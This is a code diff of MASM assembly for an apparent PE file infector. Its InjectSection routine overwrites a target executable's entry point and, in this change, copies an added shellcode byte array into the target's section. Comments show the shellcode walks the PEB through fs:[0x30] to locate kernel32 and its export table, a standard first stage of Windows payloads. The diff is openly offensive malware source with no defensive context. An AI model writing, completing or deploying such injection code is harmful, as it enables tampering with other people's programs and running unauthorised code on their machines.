@@ -51,6 +51,28 @@ includelib C:\masm32\lib\masm32.lib
 	imgEntryPoint	dd		0
 	sectionsHeader	dd		0
 
+	;
+	;	Custom code
+	;
+	; pop eax
+	
+	;
+	;
+	;
+	
+    ;push esi
+	;xor eax, eax
+	;mov eax, fs:[eax + 0x30]
+	;mov eax, [eax + 0x0c]
+	;mov eax, [eax + 0x14]
+	;mov eax, [eax]
+	;mov eax, [eax]
+	;mov eax, [eax + 0x10]
+    code			db 056h, 031h, 0C0h, 064h, 08Bh, 040h, 030h, 08Bh,
+					040h, 00Ch, 08Bh, 040h, 014h, 08Bh, 000h, 08Bh,
+					000h, 08Bh, 040h, 010h, 089h, 045h, 000h, 089h, 
+					0C3h, 003h, 05Bh, 03Ch, 08Bh, 05Bh, 078h, 003h, 
+					05Dh, 000h, 089h, 05Dh, 004h, 0
 ;
 ; Struct url
 ;
@@ -240,6 +262,8 @@ InjectSection proc lastSection:DWORD
 	mov edx, [esi].IMAGE_SECTION_HEADER.VirtualAddress
 	mov ebx, [esi].IMAGE_SECTION_HEADER.SizeOfRawData
 	add edx, ebx
+	;and edx, 0FFFFF000h
+	;add edx, 1000h
 	mov virtualEnd, edx
 	
 	; Overwrite entry point
@@ -283,8 +307,9 @@ InjectSection proc lastSection:DWORD
 	mov edx, targetSection
 	mov ebx, mappedAddr
 	add edx, ebx
-	mov DWORD PTR [edx], 41414141h
-	;invoke MemCopy, ADDR code, edx, 14h
+	;mov DWORD PTR [edx], 41414141h
+	invoke MemCopy, ADDR code, edx, 25h
+	
 	;mov DWORD ptr [edx], ebx
 	
 	
